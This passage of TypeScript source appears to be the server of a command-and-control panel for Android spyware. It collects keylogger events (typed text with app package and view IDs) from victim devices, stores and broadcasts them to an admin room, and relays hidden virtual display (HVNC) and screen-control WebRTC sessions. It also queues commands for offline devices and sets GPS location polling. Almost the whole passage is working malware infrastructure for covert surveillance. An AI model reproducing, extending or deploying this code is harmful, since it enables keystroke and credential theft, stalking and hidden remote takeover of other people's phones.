        // ── clearSynced response: { action: 'clearSynced', success: boolean } ──
        if (data.action === 'clearSynced') {
          dbHelpers.setClientData(id, 'keylogger', '[]');
          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger synced data cleared on ${id}`, '');
          broadcastData('keylogger');
          return;
        }

        // ── getHistory response: { action: 'getHistory', history: [...], total: number } ──
        if (data.history && Array.isArray(data.history)) {
          const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
          // Dedup: bỏ qua entry đã tồn tại (dùng DB row id)
          const seenIds = new Set<number>();
          for (const e of existing) {
            if (e._dbId != null) seenIds.add(e._dbId as number);
          }
          for (const item of data.history) {
            const dbId = item.id != null ? Number(item.id) : null;
            if (dbId != null && seenIds.has(dbId)) continue;
            if (dbId != null) seenIds.add(dbId);
            existing.push({
              type: 'history',
              eventType: item.eventType || '',
              pkg: item.pkg || '',
              cls: item.cls || '',
              viewId: item.viewId || '',
              text: item.txt || item.text || '',
              extra: item.extra || '',
              timestamp: item.ts || data.timestamp || new Date().toISOString(),
              _dbId: dbId,
            });
          }
          if (existing.length > 10000) {
            existing.splice(0, existing.length - 10000);
          }
          dbHelpers.setClientData(id, 'keylogger', JSON.stringify(existing));
          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger history received from ${id}`, JSON.stringify({
            historyCount: data.history.length,
            total: data.total ?? data.history.length,
          }));
          broadcastData('keylogger');
          return;
        }

        // ── Live + offline batch (standard flush) ──
        const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
        // Dedup set: tránh trùng lặp khi client re-flush cùng một entry (dùng DB row id)
        const seenIds = new Set<number>();
        for (const e of existing) {
          if (e._dbId != null) seenIds.add(e._dbId as number);
        }

        // Live entries: now sent as array of structured objects
        if (data.live && Array.isArray(data.live)) {
          for (const item of data.live) {
            existing.push({
              type: 'live',
              eventType: item.eventType || '',
              pkg: item.pkg || '',
              cls: item.cls || '',
              viewId: item.viewId || '',
              text: item.txt || item.text || '',
              extra: item.extra || '',
              timestamp: item.ts || data.timestamp || new Date().toISOString(),
            });
          }
        } else if (data.live && typeof data.live === 'string' && data.live.trim()) {
          // Backward compat: raw string blob from older clients
          existing.push({ type: 'live', content: data.live, timestamp: data.timestamp || new Date().toISOString() });
        }

        if (data.offlineBatch && Array.isArray(data.offlineBatch)) {
          for (const item of data.offlineBatch) {
            const dbId = item.id != null ? Number(item.id) : null;
            // Bỏ qua entry đã tồn tại (trùng DB row id)
            if (dbId != null && seenIds.has(dbId)) continue;
            if (dbId != null) seenIds.add(dbId);
            existing.push({
              type: 'offline',
              eventType: item.eventType || '',
              pkg: item.pkg || '',
              cls: item.cls || '',
              viewId: item.viewId || '',
              text: item.txt || item.text || '',
              extra: item.extra || '',
              timestamp: item.ts || data.timestamp || new Date().toISOString(),
              _dbId: dbId,
            });
          }
        }

        if (existing.length > 10000) {
          existing.splice(0, existing.length - 10000);
        }
        dbHelpers.setClientData(id, 'keylogger', JSON.stringify(existing));
        dbHelpers.addLog('DATA', 'KEYLOGGER', `Keystroke data received from ${id}`, JSON.stringify({
          liveCount: Array.isArray(data.live) ? data.live.length : (data.live ? 1 : 0),
          offlineCount: data.offlineBatch?.length || 0,
          totalQueued: data.totalQueued,
        }));
        broadcastData('keylogger');
      } catch (err: unknown) { log.error(`Keylogger handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // Screen control: relay from admin to device (handled via cmd route)
    socket.on(CMD.SCREEN_CTRL, (data: any) => {
      try {
        if (data.accessible !== undefined) {
          this.io.to(`screen:${id}`).emit('screen:status', { id, accessible: data.accessible });
        }
        if (data.error) {
          this.io.to(`screen:${id}`).emit('screen:error', { id, error: data.error });
        }
      } catch (err: unknown) { log.error(`Screen control handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // WebRTC Signaling (Device -> Admin)
    socket.on(CMD.WEBRTC_ANSWER, (data: any) => {
      try {
        const sessionId = readSessionId(data?.sessionId);
        if (!sessionId || typeof data?.sdp !== 'string' || data.sdp.length === 0 || data.sdp.length > 2_000_000) return;
        this.io.to(`screen:${id}`).emit('webrtc:answer', {
          id, sessionId, sdp: data.sdp,
        });
      } catch (err: unknown) { log.error(`WebRTC Answer error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.WEBRTC_ICE, (data: any) => {
      try {
        const sessionId = readSessionId(data?.sessionId);
        if (!sessionId || typeof data?.candidate !== 'string' || data.candidate.length === 0 || data.candidate.length > 16_384) return;
        const sdpMLineIndex = Number.isInteger(data.sdpMLineIndex) && data.sdpMLineIndex >= 0
          ? data.sdpMLineIndex
          : 0;
        this.io.to(`screen:${id}`).emit('webrtc:ice', {
          id,
          sessionId,
          candidate: data.candidate,
          sdpMid: typeof data.sdpMid === 'string' ? data.sdpMid : null,
          sdpMLineIndex,
        });
      } catch (err: unknown) { log.error(`WebRTC ICE error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // HVNC: Hidden Virtual Display status relay
    socket.on(CMD.HVNC, (data: any) => {
      try {
        if (data.type === 'status') {
          this.io.to(`hvnc:${id}`).emit('hvnc:status', {
            id,
            streaming: data.streaming,
            virtualWidth: data.virtualWidth,
            virtualHeight: data.virtualHeight,
            displayId: data.displayId,
            densityDpi: data.densityDpi,
            fps: data.fps,
            transport: data.transport,
            connectionState: data.connectionState,
            sessionId: data.sessionId,
            authVerified: data.authVerified,
          });
          broadcastData('hvnc');
        } else if (data.type === 'error' && data.error) {
          this.io.to(`hvnc:${id}`).emit('hvnc:error', { id, sessionId: data.sessionId, error: data.error });
          dbHelpers.addLog('ERROR', 'HVNC', `HVNC error from ${id}: ${data.error}`);
        }
      } catch (err: unknown) { log.error(`HVNC handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // HVNC WebRTC signaling (Device -> Admin)
    socket.on(CMD.HVNC_ANSWER, (data: any) => {
      try {
        const sessionId = readSessionId(data?.sessionId);
        if (!sessionId || typeof data?.sdp !== 'string' || data.sdp.length === 0 || data.sdp.length > 2_000_000) return;
        this.io.to(`hvnc:${id}`).emit('hvnc:answer', {
          id, sessionId, sdp: data.sdp,
        });
      } catch (err: unknown) { log.error(`HVNC Answer error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.HVNC_ICE, (data: any) => {
      try {
        const sessionId = readSessionId(data?.sessionId);
        if (!sessionId || typeof data?.candidate !== 'string' || data.candidate.length === 0 || data.candidate.length > 16_384) return;
        const sdpMLineIndex = Number.isInteger(data.sdpMLineIndex) && data.sdpMLineIndex >= 0
          ? data.sdpMLineIndex
          : 0;
        this.io.to(`hvnc:${id}`).emit('hvnc:ice', {
          id,
          sessionId,
          candidate: data.candidate,
          sdpMid: typeof data.sdpMid === 'string' ? data.sdpMid : null,
          sdpMLineIndex,
        });
      } catch (err: unknown) { log.error(`HVNC ICE error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.HVNC_CTRL, (data: any) => {
      try {
        if (data.active !== undefined) {
          this.io.to(`hvnc:${id}`).emit('hvnc:status', { id, streaming: data.active });
        }
        if (data.error) {
          this.io.to(`hvnc:${id}`).emit('hvnc:error', { id, error: data.error });
        }
      } catch (err: unknown) { log.error(`HVNC control handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });
  }

  send(clientId: string, cmd: CmdType, params: Record<string, unknown> = {}): boolean {
    const socket = this.sockets.get(clientId);
    if (socket) {
      socket.emit('order', { type: cmd, ...params, timestamp: Date.now() });
      const details = REALTIME_COMMANDS.has(cmd) ? undefined : JSON.stringify(params);
      dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, details);
      return true;
    } else {
      if (REALTIME_COMMANDS.has(cmd)) return false;
      this.queueCommand(clientId, cmd, params);
      dbHelpers.addLog('COMMAND', 'QUEUE', `Command ${cmd} queued for ${clientId}`, JSON.stringify(params));
      return false;
    }
  }

  private queueCommand(clientId: string, cmd: CmdType, params: Record<string, unknown>): void {
    const queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue'));
    const filtered = queue.filter((q: any) => q.type !== cmd);
    filtered.push({ type: cmd, ...params, timestamp: Date.now() });
    dbHelpers.setClientData(clientId, 'queue', JSON.stringify(filtered));
  }

  private runQueuedCommands(clientId: string): void {
    const queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue'));
    if (queue.length === 0) return;
    const socket = this.sockets.get(clientId);
    if (!socket) return;
    for (const cmd of queue) socket.emit('order', cmd);
    dbHelpers.setClientData(clientId, 'queue', JSON.stringify([]));
    dbHelpers.addLog('COMMAND', 'QUEUE', `Ran ${queue.length} queued commands for ${clientId}`);
  }

  setGps(clientId: string, interval: number): void {
    const d = getDb();
    const existing = d.select({ id: clients.id }).from(clients).where(eq(clients.id, clientId)).get();
    if (!existing) {
      log.warn(`setGps: Client ${clientId} not found in database, skipping`);
      return;
    }
    const oldTimer = this.gpsTimers.get(clientId);
    if (oldTimer) { clearInterval(oldTimer); this.gpsTimers.delete(clientId); }
    d.update(clients).set({ gpsInterval: interval }).where(eq(clients.id, clientId)).run();
    if (interval > 0) {
      this.send(clientId, CMD.LOCATION, { action: 'start', interval });
    } else {
      this.send(clientId, CMD.LOCATION, { action: 'stop' });
    }
  }

  private restoreGpsPolling(clientId: string): void {
    const d = getDb();
    const client = d.select({ gpsInterval: clients.gpsInterval }).from(clients).where(eq(clients.id, clientId)).get();
    if (client && client.gpsInterval != null && client.gpsInterval > 0) this.setGps(clientId, client.gpsInterval);
  }

  getOnlineCount(): number { return this.sockets.size; }
  isClientConnected(clientId: string): boolean { return this.sockets.has(clientId); }
  deliverCredentialRotation(clientId: string, deviceSecret: string): boolean {
    const socket = this.sockets.get(clientId);
    if (!socket) return false;
    socket.emit('credential:rotate', { deviceSecret });
    return true;
  }
  getIO(): SocketIOServer { return this.io; }
  broadcast(event: string, data: any): void { this.io.to('admin').emit(event, data); }

  cleanupStaleTransfers(): void {
    const now = Date.now();
    for (const [transferId, transfer] of this.transfers) {
      if (now - transfer.receivedAt > 10 * 60 * 1000) this.transfers.delete(transferId);
    }
  }

  cleanupStaleClients(): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
    const result = d.delete(clients).where(sql`${clients.online} = 0 AND ${clients.lastSeen} < ${cutoff}`).run();
    return result.changes;
  }

  disconnectClient(clientId: string): void {
    const socket = this.sockets.get(clientId);
    if (socket) {
      socket.disconnect(true);
      if (this.sockets.get(clientId) === socket) this.handleDisconnect(clientId, socket);
    }
  }

  shutdown(): void {
    for (const [, timer] of this.gpsTimers) clearInterval(timer);
    this.gpsTimers.clear();
    this.transfers.clear();
    this.io.close();
  }
}

export const socketService = new SocketService();
